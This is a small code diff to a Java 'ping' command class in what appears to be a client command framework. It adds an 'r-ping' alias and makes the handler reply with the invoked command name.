@@ -8,12 +8,12 @@ import br.com.introcdc.connect.client.command.ClientCommand;
 public class ClientCommandPing extends ClientCommand {
 
     public ClientCommandPing() {
-        super("ping");
+        super("ping", "r-ping");
     }
 
     @Override
     public void execute(String command, String input) throws Exception {
-        msg("ping");
+        msg(command);
     }
 
 }
